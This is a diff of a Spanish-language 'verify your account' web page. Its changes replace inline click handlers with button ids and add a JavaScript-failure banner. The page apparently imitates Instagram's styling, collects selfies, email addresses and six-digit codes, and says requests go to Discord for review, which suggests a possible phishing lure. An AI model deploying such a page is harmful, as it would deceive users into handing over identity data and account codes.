@@ -8,6 +8,11 @@
 </head>
 <body>
 
+    <!-- Indicador de debug (se oculta si JS carga bien) -->
+    <div id="js-warning" style="position:fixed;top:0;left:0;right:0;background:#ff4444;color:#fff;text-align:center;padding:8px;font-size:13px;z-index:9999;">
+        ⚠️ JavaScript no cargó. Revisa la consola (F12)
+    </div>
+
     <!-- PANTALLA INICIAL -->
     <div id="screen-home" class="screen active">
         <div class="ig-header">
@@ -17,12 +22,8 @@
         <p class="subtitle">Elige cómo quieres verificar tu cuenta</p>
         
         <div class="ig-buttons">
-            <button class="ig-btn primary" onclick="startFlow('selfie')">
-                <span class="icon">📸</span> Verificar con Selfie
-            </button>
-            <button class="ig-btn secondary" onclick="startFlow('code')">
-                <span class="icon">🔑</span> Verificar con Código
-            </button>
+            <button id="btn-selfie" class="ig-btn primary">📸 Verificar con Selfie</button>
+            <button id="btn-code" class="ig-btn secondary">🔑 Verificar con Código</button>
         </div>
         <p class="note">Proceso seguro • Revisión por soporte en Discord</p>
     </div>
@@ -30,7 +31,7 @@
     <!-- FLUJO SELFIE -->
     <div id="screen-selfie-camera" class="screen">
         <div class="ig-nav">
-            <button onclick="goHome()">✕</button>
+            <button id="btn-close-selfie">✕</button>
             <span>Selfie de Verificación</span>
         </div>
         <div class="camera-container">
@@ -38,45 +39,45 @@
             <div class="face-guide"></div>
         </div>
         <div class="shutter-area">
-            <button id="btn-capture" class="shutter-btn" onclick="capturePhoto()"></button>
+            <button id="btn-capture" class="shutter-btn"></button>
             <p class="hint">Centra tu rostro en el óvalo</p>
         </div>
     </div>
 
     <div id="screen-selfie-review" class="screen">
         <div class="ig-nav">
-            <button onclick="retakePhoto()">←</button>
+            <button id="btn-retake-selfie">←</button>
             <span>Revisar Foto</span>
         </div>
         <div class="preview-container">
             <img id="selfie-preview-img" src="" alt="Vista previa">
         </div>
         <div class="ig-buttons review-actions">
-            <button class="ig-btn secondary" onclick="retakePhoto()">Reintentar</button>
-            <button class="ig-btn primary" onclick="submitSelfie()">Usar Foto</button>
+            <button id="btn-retry-selfie" class="ig-btn secondary">Reintentar</button>
+            <button id="btn-use-selfie" class="ig-btn primary">Usar Foto</button>
         </div>
     </div>
 
     <!-- FLUJO CÓDIGO -->
     <div id="screen-code-input" class="screen">
         <div class="ig-nav">
-            <button onclick="goHome()">✕</button>
+            <button id="btn-close-code">✕</button>
             <span>Verificación por Código</span>
         </div>
         <div class="ig-form">
             <label>Tu correo electrónico</label>
             <input type="email" id="email-field" placeholder="ejemplo@correo.com">
-            <button class="ig-btn primary full" onclick="sendCode()">Enviar Código</button>
+            <button id="btn-send-code" class="ig-btn primary full">Enviar Código</button>
         </div>
     </div>
 
     <div id="screen-code-verify" class="screen">
         <div class="ig-nav">
-            <button onclick="retakeEmail()">←</button>
+            <button id="btn-back-code">←</button>
             <span>Ingresa el Código</span>
         </div>
         <div class="ig-form code-form">
-            <p>Hemos enviado un código de 6 dígitos a <strong id="code-email-display"></strong></p>
+            <p>Hemos enviado un código a <strong id="code-email-display"></strong></p>
             <div class="code-boxes">
                 <input type="text" maxlength="1" class="code-digit" data-index="0">
                 <input type="text" maxlength="1" class="code-digit" data-index="1">
@@ -85,8 +86,8 @@
                 <input type="text" maxlength="1" class="code-digit" data-index="4">
                 <input type="text" maxlength="1" class="code-digit" data-index="5">
             </div>
-            <button class="ig-btn primary full" onclick="verifyCode()">Verificar</button>
-            <button class="ig-btn text" onclick="resendCode()">Reenviar código</button>
+            <button id="btn-verify-code" class="ig-btn primary full">Verificar</button>
+            <button id="btn-resend-code" class="ig-btn text">Reenviar código</button>
         </div>
     </div>
 
@@ -104,13 +105,13 @@
         <div class="ig-success">
             <div class="check-circle">✓</div>
             <h2>Verificación Enviada</h2>
-            <p id="success-desc">Tu solicitud ha sido registrada. Nuestro equipo la revisará en Discord.</p>
+            <p id="success-desc">Tu solicitud ha sido registrada.</p>
             <div class="ig-id-box">
                 <span>ID:</span>
                 <strong id="success-id"></strong>
             </div>
-            <button class="ig-btn secondary full" onclick="copyToClipboard()">📋 Copiar ID</button>
-            <button class="ig-btn text" onclick="goHome()">Volver al inicio</button>
+            <button id="btn-copy-id" class="ig-btn secondary full">📋 Copiar ID</button>
+            <button id="btn-go-home" class="ig-btn text">Volver al inicio</button>
         </div>
     </div>
 
